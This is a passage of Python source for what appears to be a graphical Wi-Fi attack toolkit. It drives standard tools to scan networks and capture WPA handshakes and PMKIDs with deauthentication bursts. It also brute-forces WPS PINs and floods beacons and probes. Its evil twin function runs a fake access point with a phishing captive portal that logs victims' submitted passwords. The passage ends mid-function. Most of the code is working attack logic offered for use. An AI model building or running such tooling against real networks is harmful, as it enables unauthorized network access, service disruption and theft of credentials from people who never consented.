    """Return (bssid, ch, essid, enc, flag) for current selection, or None."""
    try:
        idx = int(target_var.get())
        return networks[idx - 1]
    except Exception:
        return None


def _ctx_select_target():
    _on_network_select()


def _ctx_jump_attacks():
    _on_network_select()
    try:
        nb.select(tabs["attack"])
    except Exception:
        pass


def _ctx_copy_bssid():
    t = _selected_network()
    if not t:
        return
    _clipboard_set(t[0])


def _ctx_copy_essid():
    t = _selected_network()
    if not t:
        return
    _clipboard_set(t[2])


def _ctx_copy_target_line():
    t = _selected_network()
    if not t:
        return
    bssid, ch, essid, enc, flag = t
    _clipboard_set(f"{essid} | {bssid} | ch {ch} | {enc} | {flag}")


def _ensure_net_ctx_menu():
    global net_ctx_menu
    if net_ctx_menu is not None:
        return
    net_ctx_menu = Menu(root, tearoff=0, bg="#0b0b14", fg="white", activebackground=ACCENT, activeforeground="white")
    net_ctx_menu.add_command(label="Select target", command=_ctx_select_target)
    net_ctx_menu.add_command(label="Jump → Attacks", command=_ctx_jump_attacks)
    net_ctx_menu.add_separator()
    net_ctx_menu.add_command(label="Copy BSSID", command=_ctx_copy_bssid)
    net_ctx_menu.add_command(label="Copy ESSID", command=_ctx_copy_essid)
    net_ctx_menu.add_command(label="Copy Target Line", command=_ctx_copy_target_line)


def _on_network_right_click(evt):
    if net_tree is None:
        return
    _ensure_net_ctx_menu()

    iid = net_tree.identify_row(evt.y)
    if iid:
        net_tree.selection_set(iid)
        target_var.set(str(iid))

    try:
        net_ctx_menu.tk_popup(evt.x_root, evt.y_root)
    finally:
        try:
            net_ctx_menu.grab_release()
        except Exception:
            pass


def _update_target_info(*_):
    try:
        idx = int(target_var.get())
        bssid, ch, essid, enc, flag = networks[idx - 1]
        wps = "WPS" if flag == "Y" else "no-wps"
        target_info_var.set(f"{essid}  |  {bssid}  |  ch {ch}  |  {enc}  |  {wps}")

        meta = networks_meta.get(bssid, {})
        vendor = meta.get("vendor") or lookup_vendor(bssid)
        power = meta.get("power")
        last_seen = meta.get("last_seen")
        parts = []
        if vendor and vendor != "Unknown":
            parts.append(f"vendor: {vendor}")
        if power:
            parts.append(f"pwr: {power}")
        if last_seen:
            parts.append(f"last: {last_seen}")
        target_intel_var.set(" | ".join(parts))
    except Exception:
        target_info_var.set("No target selected")
        target_intel_var.set("")


target_var.trace_add("write", _update_target_info)


def _update_status_loop():
    ap = "RUN" if (attack_proc and attack_proc.poll() is None) else "idle"
    sp = "RUN" if (scan_proc and scan_proc.poll() is None) else "idle"
    iface = iface_var.get() or "-"
    mon = "MON" if monitor_flag else "MANAGED"
    sticky = "STICKY" if sticky_mon.get() else "AUTO"
    status_var.set(f"IFACE: {iface}  |  MODE: {mon}/{sticky}  |  SCAN: {sp}  |  ATTACK: {ap}")
    root.after(500, _update_status_loop)


# ───────────── command palette (Ctrl+P) ───────────────────────────────────
# items are tuples: (label, desc, callback)
_palette_items = []
_palette_filtered = []
_palette_recent = collections.deque(maxlen=12)  # most-recent first


def _palette_match(q, text):
    q = (q or "").strip().lower()
    if not q:
        return True
    t = (text or "").lower()
    # token AND match
    for tok in q.split():
        if tok not in t:
            return False
    return True


def _build_palette_items():
    items = []

    # Recent
    for lbl, desc, cb in list(_palette_recent):
        items.append((f"★ {lbl}", desc or "Recent command", cb))

    # Navigation: main tabs
    if "tabs" in globals():
        for key, label in [
            ("scan", "Go: Scan"),
            ("attack", "Go: Attacks"),
            ("crack", "Go: Crack"),
            ("hash", "Go: Hash ID"),
            ("clean", "Go: Cleaner"),
            ("utils", "Go: Utilities"),
            ("art", "Go: Artifacts"),
        ]:
            if key in tabs:
                items.append((label, f"Switch to {key} tab", lambda k=key: nb.select(tabs[k])))

    # Navigation: logs
    if "log_nb" in globals() and log_nb is not None:
        items.extend([
            ("Log: Scan", "Focus scan output log", lambda: log_nb.select(0)),
            ("Log: Attack", "Focus attack output log", lambda: log_nb.select(1)),
            ("Log: Crack", "Focus cracking output log", lambda: log_nb.select(2)),
            ("Log: Hash", "Focus hash-id output log", lambda: log_nb.select(3)),
            ("Log: Cleaner", "Focus cleaner output log", lambda: log_nb.select(4)),
            ("Log: Utilities", "Focus utilities output log", lambda: log_nb.select(5)),
        ])

    # Global operations
    items.append(("Stop: Attack", "Stop current running attack process", stop_attack))
    items.append(("Stop: Scan", "Stop current running scan process", stop_scan))
    items.append(("Reset: Toolkit", "Stop scan/attack, reset UI state", lambda: reset_toolkit(False)))
    items.append(("Reset: Toolkit + Exit", "Reset then exit the GUI", lambda: reset_toolkit(True)))
    items.append(("Artifacts: Refresh", "Reload artifacts list from disk", refresh_artifacts))
    items.append(("Utilities: Dependency Doctor", "Check required binaries and Python modules", dependency_doctor))
    items.append(("Utilities: Interface Info", "Show driver/MAC/IP info for selected iface", utilities_iface_info))
    items.append(("Utilities: Preflight", "Run Wi-Fi preflight checks (rfkill, interfering procs, airmon-ng)", utilities_preflight))
    items.append(("Utilities: Vendor Lookup", "Lookup vendor for MAC/BSSID/OUI", utilities_vendor_lookup))
    items.append(("Utilities: Capture Sanity", "Check capture for usable handshakes/PMKIDs (via hcxpcapngtool)", utilities_capture_sanity))
    items.append(("Utilities: Restore Network", "Restore services/monitor/NAT to a sane state", utilities_restore_network))

    # Start scan
    items.append(("Scan: Focused", "Run dwell scan (channels 1/6/11)", lambda: threading.Thread(target=do_scan, daemon=True).start()))
    items.append(("Scan: Hop", "Run channel-hopping scan", lambda: threading.Thread(target=do_scan, kwargs={"channel_hop": True}, daemon=True).start()))

    # Attack actions (existing callbacks)
    if "ATTACK_ACTIONS" in globals():
        for _key, cat, btns in ATTACK_ACTIONS:
            for (txt, fn) in btns:
                items.append((f"Action: {cat} → {txt}", "Run action", fn))

    # De-dup by label while preserving order.
    seen = set()
    out = []
    for lbl, desc, cb in items:
        if lbl in seen:
            continue
        seen.add(lbl)
        out.append((lbl, desc, cb))

    return out


def _palette_update_desc():
    if palette_list is None:
        return
    sel = palette_list.curselection()
    if not sel:
        palette_desc_var.set("")
        return
    idx = int(sel[0])
    if idx < 0 or idx >= len(_palette_filtered):
        palette_desc_var.set("")
        return
    _lbl, desc, _cb = _palette_filtered[idx]
    palette_desc_var.set(desc or "")


def _palette_set_selection(idx):
    if palette_list is None:
        return
    n = palette_list.size()
    if n <= 0:
        return
    idx = max(0, min(n - 1, idx))
    palette_list.selection_clear(0, END)
    palette_list.selection_set(idx)
    palette_list.activate(idx)
    palette_list.see(idx)
    _palette_update_desc()


def _palette_move(delta):
    if palette_list is None:
        return
    cur = palette_list.curselection()
    idx = int(cur[0]) if cur else 0
    _palette_set_selection(idx + delta)


def _palette_add_recent(lbl, desc, cb):
    # Normalize starred labels
    base = lbl[2:] if lbl.startswith("★ ") else lbl
    # remove existing
    for i, (l, _d, _c) in enumerate(list(_palette_recent)):
        if l == base:
            try:
                _palette_recent.remove((l, _d, _c))
            except Exception:
                pass
            break
    _palette_recent.appendleft((base, desc, cb))


def _palette_render(query=""):
    global _palette_items, _palette_filtered
    if palette_list is None:
        return
    if not _palette_items:
        _palette_items = _build_palette_items()

    _palette_filtered = [(lbl, desc, cb) for (lbl, desc, cb) in _palette_items if _palette_match(query, lbl)]

    palette_list.delete(0, END)
    for lbl, _desc, _ in _palette_filtered[:200]:
        palette_list.insert(END, lbl)

    if _palette_filtered:
        _palette_set_selection(0)
    else:
        palette_desc_var.set("")


def _palette_close(_evt=None):
    global palette_win
    try:
        if palette_win is not None:
            palette_win.destroy()
    finally:
        palette_win = None


def _palette_run_selected(_evt=None):
    if palette_list is None:
        return
    sel = palette_list.curselection()
    if not sel:
        return
    idx = int(sel[0])
    if idx < 0 or idx >= len(_palette_filtered):
        return
    lbl, desc, cb = _palette_filtered[idx]
    _palette_close()
    try:
        cb()
        _palette_add_recent(lbl, desc, cb)
    except Exception as e:
        messagebox.showerror("Command", str(e))


def show_palette(_evt=None):
    global palette_win, palette_entry, palette_list, _palette_items

    if palette_win is not None:
        try:
            palette_win.lift()
            palette_entry.focus_set()
            return
        except Exception:
            pass

    _palette_items = []

    palette_win = Toplevel(root)
    palette_win.title("Command Palette")
    palette_win.configure(bg="#05050b")
    palette_win.geometry("720x380")
    palette_win.transient(root)
    palette_win.grab_set()

    Label(
        palette_win,
        text="COMMAND PALETTE",
        bg="#05050b",
        fg=ACCENT,
        font=("Consolas", 11, "bold"),
        pady=8,
    ).pack(fill=X)

    palette_entry = Entry(
        palette_win,
        bg="#0b0b14",
        fg="white",
        insertbackground="white",
        font=("Consolas", 11),
    )
    palette_entry.pack(fill=X, padx=12, pady=(0, 6))

    # Description line for the currently highlighted command
    Label(
        palette_win,
        textvariable=palette_desc_var,
        bg="#05050b",
        fg=NEON,
        font=("Consolas", 9),
        anchor="w",
        padx=12,
        pady=4,
    ).pack(fill=X, padx=12, pady=(0, 8))

    palette_list = Listbox(
        palette_win,
        bg="#0b0b14",
        fg=NEON,
        selectbackground=ACCENT,
        selectforeground="white",
        font=("Consolas", 10),
        height=14,
        activestyle="none",
        highlightthickness=0,
        relief="flat",
    )
    palette_list.pack(fill=BOTH, expand=True, padx=12, pady=(0, 12))

    palette_entry.bind("<Escape>", _palette_close)
    palette_list.bind("<Escape>", _palette_close)
    palette_entry.bind("<Return>", _palette_run_selected)
    palette_list.bind("<Return>", _palette_run_selected)
    palette_list.bind("<Double-1>", _palette_run_selected)

    # Arrow-key navigation even when focus is in the entry.
    palette_entry.bind("<Down>", lambda e: (_palette_move(1), "break"))
    palette_entry.bind("<Up>", lambda e: (_palette_move(-1), "break"))

    palette_list.bind("<<ListboxSelect>>", lambda _e: _palette_update_desc())

    def _on_change(_evt=None):
        _palette_render(palette_entry.get())

    palette_entry.bind("<KeyRelease>", _on_change)

    _palette_render("")
    palette_entry.focus_set()

# ───────────── Wi-Fi scan engine ──────────────────────────────────────────
def do_scan(channel_hop=False):
    global scan_proc, monitor_flag, networks_meta

    try:
        if not _require_bins(["airodump-ng", "airmon-ng", "iw"], scan_out, title="Scan requires"):
            return

        iface = (iface_var.get() or "").strip()
        if not iface:
            log(scan_out, "[!] Select interface")
            ui_call(refresh_iface_menu)
            return

        # Validate iface exists (fixes 'No such device' from stale config / wrong name).
        if not _iface_exists(iface):
            log(scan_out, f"[!] No such device: {iface}")
            log(scan_out, "[*] Available ifaces: " + ", ".join(iw_interfaces() or ["<none>"]))
            ui_call(refresh_iface_menu)
            return

        # If user enabled Killer, stop Wi-Fi managers before monitor-mode work.
        if killer_enabled.get():
            try:
                toggle_killer()
            except Exception:
                pass

        # Resolve actual monitor iface name (don't assume <iface>mon).
        mon = _resolve_monitor_iface(iface, box=scan_out)
        if not mon:
            log(scan_out, f"[!] Failed to enable monitor mode for: {iface}")
            log(scan_out, "[*] Available ifaces: " + ", ".join(iw_interfaces() or ["<none>"]))
            log(scan_out, "[*] If you see NetworkManager/wpa_supplicant in airmon-ng output: enable Killer or run 'airmon-ng check kill'")
            return

        monitor_flag = True
        ui_call(iface_var.set, mon)
        ui_call(refresh_iface_menu)

        tag = "hop" if channel_hop else "dwell"
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = os.path.join(CAP_DIR, f"scan_{tag}_{ts}")
        logf = os.path.join(CAP_DIR, f"scan_{tag}_{ts}.log")

        cmd = ["airodump-ng", "-w", fn, "--output-format", "csv"]
        if not channel_hop:
            cmd += ["-c", "1,6,11"]
        cmd.append(mon)

        # airodump-ng is a curses-style app that spams ANSI control codes.
        # For scans we don't need to stream its live screen output into the GUI;
        # we only need the CSV it writes.
        scan_proc = run(cmd, outfile=logf, box=scan_out)
        _record_proc("scan", scan_proc, cmd, logf)
        log(scan_out, f"[*] scanning ({tag})… (writing CSV)")

        time.sleep(scan_time.get())
        _kill_proc_group(scan_proc, timeout_s=1.5)

        csvp = fn + "-01.csv"
        scan_proc = None

        if not os.path.isfile(csvp):
            log(scan_out, f"[!] CSV missing: {csvp}")
            ui_call(restore_monitor)
            return

        base = parse_csv(csvp)
        chans = sorted({str(ch).strip() for (_bssid, ch, *_rest) in base if str(ch).strip()})
        wps = detect_wps(mon, chans)

        global networks
        networks = []
        networks_meta = {}

        ui_log.write(scan_out, "# |      BSSID       | CH | ENC | WPS | ESSID\n" + "-" * 72 + "\n")
        for i, (bssid, ch, essid, enc, power, last_seen) in enumerate(base, 1):
            flag = "Y" if bssid in wps else "-"
            networks.append((bssid, ch, essid, enc, flag))
            networks_meta[bssid] = {
                "power": power,
                "last_seen": last_seen,
                "vendor": lookup_vendor(bssid),
            }
            ui_log.write(scan_out, f"{i:2}| {bssid} |{ch:>3}|{enc:^5}|  {flag} | {essid}\n")

        # Refresh the cyberpunk network table on the main thread.
        ui_call(refresh_network_tree)

        log(scan_out, f"[+] {len(networks)} nets.")
        ui_call(restore_monitor)
    except Exception as e:
        log(scan_out, f"[!] Scan crashed: {e}")
        try:
            log(scan_out, traceback.format_exc())
        except Exception:
            pass
        try:
            ui_call(restore_monitor)
        except Exception:
            pass

def stop_scan():
    global scan_proc
    if scan_proc and scan_proc.poll() is None:
        _kill_proc_group(scan_proc, timeout_s=1.5)
        scan_proc = None
        restore_monitor()
        log(scan_out, "[!] Scan aborted")

# ───────────── nmap helper ────────────────────────────────────────────────
def start_nmap_scan():
    tgt=nmap_target.get().strip()
    if not tgt:
        messagebox.showwarning("Target","Specify host/CIDR"); return
    profiles={"Quick Ping":["-sn"],"Top-100 Ports":["-F"],"Full TCP":["-sS","-p-"],
              "OS Detect":["-O","-sS","-F"],"Vuln Script":["--script","vuln"],
              "Custom":nmap_custom.get().split()}
    opts=profiles[nmap_profile.get()]
    out=os.path.join(CAP_DIR,f"nmap_{tgt.replace('/','_')}_{int(time.time())}.log")
    log(scan_out,f"[*] nmap {' '.join(opts)} {tgt}")
    run_logged(["nmap",*opts,tgt],scan_out,out)

# ───────────── handshake monitor ──────────────────────────────────────────
def handshake_monitor(cap,bssid):
    global attack_proc
    while attack_proc and attack_proc.poll() is None:
        try:
            out = subprocess.check_output(
                ["aircrack-ng", "-a", "2", "-w", "/dev/null", "-b", bssid, cap],
                text=True, stderr=subprocess.DEVNULL, timeout=20
            )
            if "handshake" in out.lower():
                log(att_out, "[+] Handshake found – stopping")
                _kill_proc_group(attack_proc, timeout_s=2.0)
                attack_proc = None
                restore_monitor()
                return
        except subprocess.TimeoutExpired:
            pass
        time.sleep(15)

# ───────────── attack helpers (stdin=True) ────────────────────────────────
def pick_target():
    if not target_var.get():
        messagebox.showinfo("Target","Pick BSSID"); return None
    return networks[int(target_var.get())-1]

# ---- Capture modules ------------------------------------------------------
def start_pmkid():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "hcxdumptool"], att_out):
        return

    bssid, ch, essid, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    pcap = os.path.join(CAP_DIR, f"pmkid_{essid}_{int(time.time())}.pcapng")
    logf = os.path.join(CAP_DIR, f"pmkid_{essid}_{int(time.time())}.log")

    cmd = ["hcxdumptool", "-i", mon, "--filterlist_ap", bssid, "--enable_status=1", "-o", pcap]

    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["hcxdumptool"], preview_title="PMKID Capture")
    log(att_out, f"[*] PMKID capture → {pcap}")
    ui_call(refresh_artifacts)

def start_handshake():
    t = pick_target(); iface = iface_var.get()
    if not t:
        return
    bssid, ch, essid, _, _ = t

    set_monitor(iface, True)
    mon = iface_var.get()

    pref = os.path.join(CAP_DIR, f"hs_{essid}_{int(time.time())}")
    cmd = ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", pref, mon]
    global attack_proc
    attack_proc = run_logged(cmd, att_out, pref + ".log", stdin=True)
    _record_proc("attack", attack_proc, cmd, pref + ".log")

    # Deauth burst should not block the GUI thread.
    def _burst():
        run(["aireplay-ng", "-0", "10", "-a", bssid, mon], box=att_out)

    threading.Thread(target=_burst, daemon=True).start()
    threading.Thread(target=handshake_monitor, args=(pref + "-01.cap", bssid), daemon=True).start()

def start_mass_pmkid():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["airmon-ng", "hcxdumptool", "hcxpcapngtool"], att_out):
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    pcap = os.path.join(CAP_DIR, f"pmkid_sweep_{datetime.now():%Y%m%d_%H%M%S}.pcapng")
    logf = os.path.join(CAP_DIR, f"pmkid_sweep_{int(time.time())}.log")

    cmd = ["hcxdumptool", "-i", mon, "--enable_status=15", "-o", pcap]

    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["hcxdumptool"], preview_title="Mass PMKID Sweep")

    def batch():
        while attack_proc and attack_proc.poll() is None:
            conv = pcap.replace(".pcapng", f"_{int(time.time())}.hccapx")
            run(["hcxpcapngtool", "-o", conv, pcap], box=att_out).wait()
            log(att_out, f"[+] PMKID batch → {conv}")
            ui_call(refresh_artifacts)
            time.sleep(300)

    threading.Thread(target=batch, daemon=True).start()
    log(att_out, "[*] Mass PMKID sweep running")
    ui_call(refresh_artifacts)

def start_capture_all_handshakes():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["airmon-ng", "airodump-ng"], att_out):
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    pref = os.path.join(CAP_DIR, f"capture_all_hs_{int(time.time())}")
    cmd = ["airodump-ng", "-w", pref, mon]
    global attack_proc
    attack_proc = run_logged(cmd, att_out, pref + ".log", stdin=True)
    _record_proc("attack", attack_proc, cmd, pref + ".log")
    log(att_out, "[*] Capturing all handshakes...")
    ui_call(refresh_artifacts)

def start_targeted_handshake_capture():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    client = client_var.get()
    if not client:
        messagebox.showwarning("Client", "Select a client to target.")
        return
    if not _require_bins(["airmon-ng", "airodump-ng", "aireplay-ng"], att_out):
        return

    bssid, ch, essid, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    pref = os.path.join(CAP_DIR, f"targeted_hs_{essid}_{int(time.time())}")
    cmd = ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", pref, mon]
    global attack_proc
    attack_proc = run_logged(cmd, att_out, pref + ".log", stdin=True)
    _record_proc("attack", attack_proc, cmd, pref + ".log")

    def _burst():
        run(["aireplay-ng", "-0", "10", "-a", bssid, "-c", client, mon], box=att_out)

    threading.Thread(target=_burst, daemon=True).start()
    threading.Thread(target=handshake_monitor, args=(pref + "-01.cap", bssid), daemon=True).start()
    log(att_out, f"[*] Targeted handshake capture on {client} running")
    ui_call(refresh_artifacts)

def start_targeted_pmkid_capture():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    client = client_var.get()
    if not client:
        messagebox.showwarning("Client", "Select a client to target.")
        return
    if not _require_bins(["airmon-ng", "hcxdumptool"], att_out):
        return

    bssid, ch, essid, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    pcap = os.path.join(CAP_DIR, f"targeted_pmkid_{essid}_{int(time.time())}.pcapng")
    logf = os.path.join(CAP_DIR, f"targeted_pmkid_{essid}_{int(time.time())}.log")

    cmd = ["hcxdumptool", "-i", mon, "--filterlist_ap", bssid, "--filterlist_client", client, "--enable_status=1", "-o", pcap]

    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["hcxdumptool"], preview_title="Targeted PMKID Capture")
    log(att_out, f"[*] Targeted PMKID capture on {client} running")
    ui_call(refresh_artifacts)

# ---- Other attack functions (WPS / Deauth / Beacon / WPA3 / etc.) --------
#      All remain identical; only button width changed in GUI.

def start_evil_twin():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["airmon-ng", "dnsmasq", "iptables", "sysctl", "hostapd-mana"], att_out):
        return

    essid = simpledialog.askstring("ESSID", "Target ESSID", parent=root)
    if not essid:
        return
    ch = simpledialog.askstring("Channel", "Target Channel", parent=root)
    if not ch:
        return
    uplink = simpledialog.askstring("Uplink iface", "Outbound NIC (optional)", parent=root)

    portal_html_path = filedialog.askopenfilename(
        title="Select a captive portal HTML file",
        filetypes=[("HTML files", "*.html *.htm"), ("All files", "*.*")]
    )

    set_monitor(iface, True)
    mon = iface_var.get()

    if uplink:
        enable_nat(uplink, mon)

    # Create hostapd-mana config
    cfg = os.path.join(CAP_DIR, "mana.conf")
    with open(cfg, "w") as f:
        f.write(f"interface={mon}\n")
        f.write("driver=nl80211\n")
        f.write(f"ssid={essid}\n")
        f.write("hw_mode=g\n")
        f.write(f"channel={ch}\n")
    
    cmd = ["hostapd-mana", cfg]
    logf = os.path.join(CAP_DIR, f"evil_twin_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["hostapd-mana"], preview_title="Evil Twin AP")

    # Create and run dnsmasq
    dns_conf = os.path.join(CAP_DIR, "karma.dnsmasq")
    with open(dns_conf, "w") as f:
        f.write(f"interface={mon}\n")
        f.write("dhcp-range=10.0.0.20,10.0.0.250,12h\n")
        f.write("dhcp-option=3,10.0.0.1\n")
        f.write("dhcp-option=6,10.0.0.1\n")
        f.write("server=8.8.8.8\n")
        f.write("log-queries\n")
        f.write("log-dhcp\n")
        f.write("listen-address=127.0.0.1\n")
    p = run(["dnsmasq", "--conf-file=" + dns_conf], box=att_out)
    aux_procs.append(p)

    # Create and run captive portal
    creds_log = os.path.join(CAP_DIR, "evil_twin_creds.log")
    
    if not portal_html_path:
        # Create a simple index.html for the captive portal if none is selected
        portal_html_path = os.path.join(CAP_DIR, "index.html")
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
        <title>WiFi Login</title>
        </head>
        <body>
        <h1>Please log in to continue</h1>
        <form action="/login" method="post">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password">
        <input type="submit" value="Log In">
        </form>
        </body>
        </html>
        """
        with open(portal_html_path, "w") as f:
            f.write(html_content)

    def captive_portal():
        from http.server import HTTPServer, BaseHTTPRequestHandler
        import cgi

        class CaptivePortal(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/":
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    with open(portal_html_path, "rb") as f:
                        self.wfile.write(f.read())
                else:
                    self.send_response(302)
                    self.send_header("Location", "/")
                    self.end_headers()

            def do_POST(self):
                if self.path == "/login":
                    form = cgi.FieldStorage(
                        fp=self.rfile,
                        headers=self.headers,
                        environ={"REQUEST_METHOD": "POST"}
                    )
                    password = form.getvalue("password")
                    with open(creds_log, "a") as f:
                        f.write(f"[{datetime.now()}] Password: {password}\n")
                    log(att_out, f"[+] Captured password: {password}")
                    self.send_response(302)
                    self.send_header("Location", "/")
                    self.end_headers()

        httpd = HTTPServer(("10.0.0.1", 80), CaptivePortal)
        httpd.serve_forever()

    portal_thread = threading.Thread(target=captive_portal, daemon=True)
    portal_thread.start()

    log(att_out, f"[*] Evil Twin AP for {essid} running")
    log(att_out, f"[*] Captive portal running, credentials will be logged to {creds_log}")
    ui_call(refresh_artifacts)

def start_mana_attack():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["airmon-ng", "dnsmasq", "iptables", "sysctl", "hostapd-mana"], att_out):
        return

    uplink = simpledialog.askstring("Uplink iface", "Outbound NIC (optional)", parent=root)

    set_monitor(iface, True)
    mon = iface_var.get()

    if uplink:
        enable_nat(uplink, mon)

    # Create hostapd-mana config
    cfg = os.path.join(CAP_DIR, "mana.conf")
    with open(cfg, "w") as f:
        f.write(f"interface={mon}\n")
        f.write("driver=nl80211\n")
        f.write("ssid=FreeWifi\n")
        f.write("hw_mode=g\n")
        f.write("channel=6\n")
        f.write("enable_mana=1\n")
    
    cmd = ["hostapd-mana", cfg]
    logf = os.path.join(CAP_DIR, f"mana_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["hostapd-mana"], preview_title="MANA Attack")

    # Create and run dnsmasq
    dns_conf = os.path.join(CAP_DIR, "karma.dnsmasq")
    with open(dns_conf, "w") as f:
        f.write(f"interface={mon}\n")
        f.write("dhcp-range=10.0.0.20,10.0.0.250,12h\n")
    p = run(["dnsmasq", "--conf-file=" + dns_conf], box=att_out)
    aux_procs.append(p)

    log(att_out, "[*] MANA attack running")
    ui_call(refresh_artifacts)

def start_known_beacon_attack():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["airmon-ng", "mdk4"], att_out):
        return

    wordlist = filedialog.askopenfilename(
        title="Select SSID wordlist",
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
    )
    if not wordlist:
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["mdk4", mon, "b", "-f", wordlist]

    logf = os.path.join(CAP_DIR, f"known_beacon_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["mdk4"], preview_title="Known Beacon Attack")
    log(att_out, "[*] Known Beacon attack running")
    ui_call(refresh_artifacts)

def start_wps():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng"], att_out):
        return

    bssid, ch, essid, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    tool = "reaver" if shutil.which("reaver") else "bully"
    if tool == "reaver":
        if not _require_bins(["reaver"], att_out):
            return
        cmd = ["reaver", "-i", mon, "-b", bssid, "-c", ch, "-vv"]
    else:
        if not _require_bins(["bully"], att_out):
            return
        cmd = ["bully", "-b", bssid, "-c", ch, mon]

    logf = os.path.join(CAP_DIR, f"wps_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=[tool], preview_title="WPS")
    log(att_out, f"[*] {tool} running")
    ui_call(refresh_artifacts)

def start_wps_null_pin():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "reaver"], att_out):
        log(att_out, "[!] WPS Null PIN attack requires reaver.")
        return

    bssid, ch, essid, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["reaver", "-i", mon, "-b", bssid, "-c", ch, "-p", "", "-vv"]

    logf = os.path.join(CAP_DIR, f"wps_nullpin_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["reaver"], preview_title="WPS Null PIN")
    log(att_out, "[*] WPS Null PIN attack running")
    ui_call(refresh_artifacts)

def start_wps_known_pins():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "reaver"], att_out):
        log(att_out, "[!] WPS Known PINs attack requires reaver.")
        return

    bssid, ch, essid, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    known_pins = [
        "12345670", "01234567", "00000000", "11111111", "22222222",
        "33333333", "44444444", "55555555", "66666666", "77777777",
        "88888888", "99999999", "09876543", "12341234", "12345678",
        "87654321"
    ]

    logf = os.path.join(CAP_DIR, f"wps_knownpins_{essid}_{int(time.time())}.log")

    def _run():
        for pin in known_pins:
            log(att_out, f"[*] Testing known PIN: {pin}")
            cmd = ["reaver", "-i", mon, "-b", bssid, "-c", ch, "-p", pin, "-vv"]
            global attack_proc
            attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["reaver"], preview_title=f"WPS Known PIN: {pin}")
            
            # Wait for the process to finish before trying the next PIN
            if attack_proc:
                attack_proc.wait()
            
            # Check if the attack was successful
            with open(logf, "r") as f:
                if "WPS PIN: " in f.read():
                    log(att_out, f"[+] Found WPS PIN: {pin}")
                    break
        log(att_out, "[*] WPS Known PINs attack finished.")

    threading.Thread(target=_run, daemon=True).start()
    log(att_out, "[*] WPS Known PINs attack running")
    ui_call(refresh_artifacts)

def start_deauth():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng"], att_out):
        return

    bssid, _, essid, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    if shutil.which("mdk4"):
        cmd, tag = ["mdk4", mon, "d", "-B", bssid], "mdk4"
        req = ["mdk4"]
    else:
        cmd, tag = ["aireplay-ng", "--deauth", "0", "-a", bssid, mon], "aireplay"
        req = ["aireplay-ng"]

    logf = os.path.join(CAP_DIR, f"{tag}_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=req, preview_title="Deauth")
    log(att_out, "[*] Deauth flood running")
    ui_call(refresh_artifacts)

def start_beacon():
    iface=iface_var.get()
    if not shutil.which("mdk4"):
        messagebox.showerror("mdk4","Install mdk4"); return
    set_monitor(iface,True); mon=iface_var.get()
    ssidfile=os.path.join(CAP_DIR,f"ssid_{int(time.time())}.txt")
    with open(ssidfile,"w") as f: [f.write(f"neon-{i:03}\n") for i in range(100)]
    cmd = ["mdk4",mon,"b","-f",ssidfile,"-c","1,6,11"]
    global attack_proc; attack_proc=run_logged(cmd, att_out, ssidfile+".log", stdin=True)
    _record_proc("attack", attack_proc, cmd, ssidfile+".log")
    log(att_out,"[*] Beacon spam running")

def start_probe_flood():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["airmon-ng", "mdk4"], att_out):
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["mdk4", mon, "p"]
    global attack_proc
